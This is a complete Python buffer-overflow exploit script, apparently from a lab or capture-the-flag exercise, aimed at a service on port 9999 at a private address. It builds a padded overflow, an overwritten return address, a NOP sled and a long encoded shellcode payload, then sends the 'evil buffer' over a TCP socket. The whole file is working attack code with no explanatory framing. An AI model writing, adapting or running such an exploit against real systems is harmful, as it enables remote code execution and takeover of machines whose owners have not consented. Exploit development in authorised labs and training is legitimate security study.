#!/usr/bin/env python3

import socket

ip = "10.10.125.100"
port = 9999

offset = 524
overflow = "A" * offset
# 311712F3
retn = "\xF3\x12\x17\x31"
padding = "\x90" * 16
payload = ("\xd9\xc7\xbf\x77\x1d\x9b\xcb\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x78\x17\x03\x78\x17\x83\xb7\x19\x79\x3e\xcb\xca\xff"
"\xc1\x33\x0b\x60\x4b\xd6\x3a\xa0\x2f\x93\x6d\x10\x3b\xf1\x81"
"\xdb\x69\xe1\x12\xa9\xa5\x06\x92\x04\x90\x29\x23\x34\xe0\x28"
"\xa7\x47\x35\x8a\x96\x87\x48\xcb\xdf\xfa\xa1\x99\x88\x71\x17"
"\x0d\xbc\xcc\xa4\xa6\x8e\xc1\xac\x5b\x46\xe3\x9d\xca\xdc\xba"
"\x3d\xed\x31\xb7\x77\xf5\x56\xf2\xce\x8e\xad\x88\xd0\x46\xfc"
"\x71\x7e\xa7\x30\x80\x7e\xe0\xf7\x7b\xf5\x18\x04\x01\x0e\xdf"
"\x76\xdd\x9b\xfb\xd1\x96\x3c\x27\xe3\x7b\xda\xac\xef\x30\xa8"
"\xea\xf3\xc7\x7d\x81\x08\x43\x80\x45\x99\x17\xa7\x41\xc1\xcc"
"\xc6\xd0\xaf\xa3\xf7\x02\x10\x1b\x52\x49\xbd\x48\xef\x10\xaa"
"\xbd\xc2\xaa\x2a\xaa\x55\xd9\x18\x75\xce\x75\x11\xfe\xc8\x82"
"\x56\xd5\xad\x1c\xa9\xd6\xcd\x35\x6e\x82\x9d\x2d\x47\xab\x75"
"\xad\x68\x7e\xd9\xfd\xc6\xd1\x9a\xad\xa6\x81\x72\xa7\x28\xfd"
"\x63\xc8\xe2\x96\x0e\x33\x65\x93\xc3\x22\x87\xcb\xd9\x54\x76"
"\x50\x57\xb2\x12\x78\x31\x6d\x8b\xe1\x18\xe5\x2a\xed\xb6\x80"
"\x6d\x65\x35\x75\x23\x8e\x30\x65\xd4\x7e\x0f\xd7\x73\x80\xa5"
"\x7f\x1f\x13\x22\x7f\x56\x08\xfd\x28\x3f\xfe\xf4\xbc\xad\x59"
"\xaf\xa2\x2f\x3f\x88\x66\xf4\xfc\x17\x67\x79\xb8\x33\x77\x47"
"\x41\x78\x23\x17\x14\xd6\x9d\xd1\xce\x98\x77\x88\xbd\x72\x1f"
"\x4d\x8e\x44\x59\x52\xdb\x32\x85\xe3\xb2\x02\xba\xcc\x52\x83"
"\xc3\x30\xc3\x6c\x1e\xf1\xe3\x8e\x8a\x0c\x8c\x16\x5f\xad\xd1"
"\xa8\x8a\xf2\xef\x2a\x3e\x8b\x0b\x32\x4b\x8e\x50\xf4\xa0\xe2"
"\xc9\x91\xc6\x51\xe9\xb3")
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  s.close()
  print("Done!")
except:
  print("Could not connect.")